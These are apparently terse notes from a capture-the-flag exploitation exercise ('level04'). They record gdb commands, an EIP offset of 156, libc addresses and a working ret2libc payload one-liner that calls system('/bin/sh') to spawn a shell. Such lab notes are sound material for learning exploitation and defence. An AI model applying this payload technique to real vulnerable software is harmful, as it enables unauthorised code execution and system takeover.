set follow-fork-mode child
to debug the child process

156
is the offset to override eip

when executing shellcode with the system call execve, the child process is killed

0xf7e6aed0
system address
p system

0xf7e2c000
start address of /lib32/libc-2.15.so
info proc map

15d7ec
offset of the string /bin/sh
strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"

0xf7f897ec
address of the string /bin/sh
0xf7e2c000 + 15d7ec

(python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"' ; cat) | ./level04
